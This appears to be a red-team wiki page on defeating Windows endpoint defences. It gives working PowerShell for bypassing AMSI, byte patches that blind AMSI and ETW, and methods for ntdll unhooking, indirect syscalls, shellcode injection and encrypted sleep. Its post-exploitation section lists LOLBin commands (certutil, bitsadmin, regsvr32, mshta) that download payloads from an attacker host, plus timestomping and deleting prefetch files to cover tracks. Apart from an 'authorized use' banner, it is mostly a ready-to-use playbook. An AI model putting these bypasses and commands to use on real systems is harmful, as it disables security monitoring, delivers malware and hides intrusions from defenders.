---
title: "EDR, AMSI & Syscall Evasion"
description: "AMSI and ETW patching, userland unhooking, indirect syscalls, Halo's Gate, and shellcode loader techniques"
tags:
  - Red Team
  - Evasion
  - AMSI
  - EDR
  - Syscalls
  - Shellcode
---

# EDR, AMSI & Syscall Evasion

!!! warning "Authorized Red Team Use Only"
    These techniques exist to validate EDR coverage in **authorized adversary simulation**. Running them against systems you do not own or have written permission to test is illegal. Also note: **EDR evasion is an arms race** — everything here should be validated against your specific target's stack (CrowdStrike, Defender for Endpoint, SentinelOne, Carbon Black) in a lab first.

---

## 1. How Modern EDR Sees You

```text
+-------------------+ +----------------------+ +---------------------+

| Userland Process | | Kernel Callbacks | | Telemetry / Cloud |
|-------------------| |----------------------| |---------------------|
| ntdll.dll hooks | --> | PsSetCreateProcess | --> | Correlation engine |
| Win32 API hooks | | PsSetLoadImage | | Behavior analytics |
| AMSI (script) | | ObRegisterCallbacks | | Threat intelligence |
| ETW .NET providers| | Minifilter (fs) | | Analyst alerts |
+-------------------+ +----------------------+ +---------------------+
```

Defeating userland hooks is **only step one** — kernel callbacks (process creation, image loads, LSASS access) and cloud correlation must be handled by behavior, not just API unhooking.

---

## 2. AMSI (Antimalware Scan Interface) Bypass

AMSI scans PowerShell, JScript, VBScript, and .NET content (`AmsiScanBuffer` / `AmsiScanString`) before execution.

=== " Classic AMSI Patch (amsi.dll)"

    ```powershell
    # Overwrite the AMSI context / force AmsiScanBuffer to return E_INVALIDARG (0x80070057)
    # (This is heavily signatured today — use as a lab baseline, then move to the variants below.)

    $a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|select -First 1
    $b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|select -First 1
    [IntPtr]$ptr=$b.GetValue($null)
    [Int32[]]$buf=@(0)
    [System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
    # amsiInitFailed = true (forces the AMSI provider to be unavailable)
    $f=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
    $f.SetValue($null,$true)
    ```

=== " Python / Memory-Patching Variants"

    ```python
    # Patch AmsiScanBuffer prologue in-memory (VirtualProtect + memcpy)
    # 1. Locate: LoadLibraryW("amsi.dll"), GetProcAddress("AmsiScanBuffer")
    # 2. VirtualProtect(addr, 0x1000, PAGE_EXECUTE_READWRITE, &old)
    # 3. memcpy(addr, b"\xB8\x57\x00\x07\x80\xC3", 6) # mov eax, 0x80070057; ret
    # 4. VirtualProtect back to PAGE_EXECUTE_READ
    # Tools: SharpAmsiBypass, AMSITrigger, or your own loader
    ```

=== " Hardware Breakpoint & Provider-Mask Tricks"

    ```text
    - Hardware breakpoints on AmsiScanBuffer via VEH (Vectored Exception Handler):
        AMD64: SetThreadContext -> DR0 = AmsiScanBuffer, DR7 = 1
        The exception handler rewrites the return value. No code patch => no CRC detection.
    - AMSI provider deregistration: HKLM\SOFTWARE\Microsoft\AMSI\Providers
    - Corrupt the AMSI provider CLSID in the registry (requires admin)
    - Force `AmsiScanBuffer` to load from a copy of amsi.dll loaded from disk (manual mapping)
    - Encrypt/obfuscate the script and decrypt only at runtime (ConfuserEx, Invoke-Obfuscation)
    ```

---

## 3. ETW (Event Tracing for Windows) Patching

ETW feeds `Microsoft-Windows-Threat-Intelligence` and .NET runtime events to the EDR agent. Patching `EtwEventWrite` in `ntdll` blinds userland telemetry.

```c
// EtwEventWrite -> return 0 (NO_ERROR) immediately
// 1. GetProcAddress(ntdll, "EtwEventWrite")
// 2. Overwrite first bytes with: 0xC3 (ret) for x64, or 0x33,0xC0,0xC3 (xor eax,eax; ret)
// 3. For .NET, also patch: EtwEventWriteFull, NtTraceEvent, and the CLR's
// provider callbacks (System.Diagnostics.Tracing.EventSource).
//
// IMPORTANT: Patched ETW is itself detectable — modern EDRs compare ntdll's
// in-memory copy vs the on-disk copy, and some use kernel-side ETW (which
// userland patching CANNOT disable).
```

---

## 4. Ntdll Unhooking Strategies

| Technique | How It Works | Detection Risk |
| :--- | :--- | :--- |
| **Fresh Ntdll from Disk** | `CreateFileW("C:\Windows\System32\ntdll.dll")` → `NtCreateSection` mapping → copy `.text` over the hooked in-memory copy | Medium |
| **Known-DLL → Fresh Copy** | Load `ntdll` from `KnownDlls\ntdll.dll` section object (`NtOpenSection`) — a clean, unhooked copy | Medium |
| **Suspended Process Hollowing of ntdll** | Spawn a suspended process, read its clean ntdll, patch yours | Medium |
| **Perun's Fart / Tartarus Gate / Halo's Gate** | Dynamically locate syscall numbers by scanning *neighboring* syscalls when the target stub is hooked | Low-Medium |
| **Direct Syscalls (SysWhispers2/3, FreshyCalls)** | Emit `mov r10, rcx; mov eax, <SSN>; syscall; ret` in your own assembly — never touches ntdll | Medium (call stack origin) |
| **Indirect Syscalls** | Same, but jump to the `syscall` instruction **inside ntdll** so the return address (`Rtlp...`) looks legitimate | Low — **current best practice** |
| **Module Stomping / Phantom DLL** | Back your shellcode into a legitimately loaded DLL's memory region (e.g. `xpsservices`) | Low |

```c
// --- Halo's Gate: resolve system service numbers even if the stub is hooked ---
// For NtAllocateVirtualMemory (SSN 0x18), if the stub is hooked:
// scan NEIGHBORING syscalls (NtAllocateVirtualMemory-1, +1, -2, +2...)
// 0x4C 0x8B 0xD1 -> mov r10, rcx
// 0xB8 XX XX 00 00 -> mov eax, SSN
// ... derive the SSN by offset arithmetic from the neighboring value.
//
// Cleanest modern approach (2026):
// 1. Map a FRESH ntdll from KnownDlls and read its syscall table
// 2. Resolve SSNs from that clean copy
// 3. Execute with INDIRECT syscalls (jmp into the clean/legit ntdll stub)
// 4. Keep the call stack believable (spoofed return addresses)
```

---

## 5. Shellcode Loaders & Injection Techniques

=== " Loader Primitives"

    ```text
    ALLOCATE : NtAllocateVirtualMemory (RW), then NtProtectVirtualMemory (RX)
    WRITE : NtWriteVirtualMemory / memcpy / Section mapping
    EXECUTE : CreateThread / NtCreateThreadEx / APC / Timer / Fiber /
               Callback (EnumWindows, EnumDesktopWindows, EnumChildWindows)
    PROTECT : Encrypt shellcode at rest, decrypt in memory XOR/AES
    ENCODE : Sleep obfuscation (Ekko, Foliage, Cronos, DeathSleep) — encrypt
               beacon during sleep using ROP chains + timers
    ```

=== " Injection Target Matrix"

    ```text
    - Self-injection : simplest, highest detection (RWX in your own image)
    - Remote process (RtlCreateUserThread/PtH) : classic, heavily monitored
    - Process Hollowing : create suspended, unmap, write, resume
    - Thread Hijacking : NtSuspendThread -> NtSetContextThread -> Resume
    - APC Injection : QueueUserAPC into an alertable thread
    - Early Bird APC : inject BEFORE the main thread starts (stealthy)
    - Section Mapping (NtMapViewOfSection) : avoid WriteProcessMemory telemetry
    - Module Stomping / DLL Hollowing : hide inside a signed, loaded module
    - Transacted Hollowing : combine NTFS transactions with section mapping
    - Callback Injection : abuse Win32k/legit callbacks for execution
    - "Byte Order / Spoofed Call Stack" : make the call stack end in a legit frame
    ```

=== " Sleep Obfuscation (Ekko-style)"

    ```c
    // Beacon sleeps encrypted: EDR cannot scan the memory of a sleeping beacon.
    // 1. During sleep, encrypt the shellcode/beacon region with a ROP-based RC4/AES key
    // 2. Set up timers (NtCreateTimer) + APC to trigger the decrypt routine on wake
    // 3. Use RtlCreateTimer + SystemFunction032 (or your own RC4) for crypto
    // 4. Variants: Ekko, Foliage, Cronos, DeathSleep, Zilean (delayed execution)
    //
    // Combine with: call stack spoofing, module stomping, and hardware-breakpoint hooks.
    ```

---

## 6. Post-Exploitation OPSEC Inside the Host

```powershell
# --- Situational awareness without touching disk (PowerShell / C2 built-ins) ---
whoami /all
systeminfo | Select-String "OS Name","OS Version","Domain"
net user /domain; net group "Domain Admins" /domain
Get-MpComputerStatus | Select AMSIProviderVersion, RealTimeProtectionEnabled
# Check EDR/AV presence:
Get-Process | Where-Object { $_.Name -match 'MsMpEng|CSFalcon|SentinelAgent|CbDefense|elastic' }
driverquery /v | findstr /i "edr crowdstrike sentinel carbon"
# --- Living off the Land (LOLBins) instead of dropping tools ---
certutil -urlcache -split -f http://<LHOST>/file.dll C:\Windows\Temp\file.dll # Download
bitsadmin /transfer j /download /priority high http://<LHOST>/f.exe C:\f.exe
regsvr32 /s /n /u /i:http://<LHOST>/payload.sct scrobj.dll # AppLocker bypass
mshta http://<LHOST>/pay.hta
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();...
# Use the LOLBAS project (lolbas-project.github.io) — 200+ signed binaries
# --- Timestomping & artifact hygiene ---
Set-ItemProperty -Path C:\staged\payload.exe -Name LastWriteTime -Value "03/15/2024 09:14:22"
# Then remove: prefetch, event logs (if in scope and authorized), and your working dir
Remove-Item C:\Windows\Prefetch\PAYLOAD*.pf -Force -ErrorAction SilentlyContinue
```

!!! tip "The Golden Rule of Evasion"
    **Behavior > Bytes.** Modern EDRs alert on *what you do* (LSASS access, suspicious parent/child process chains, token manipulation, anomalous network beacons) far more than on signature bytes. Any evasion work should be paired with a behavioral review of your whole operation: parent process, command line, token, network pattern, and timing.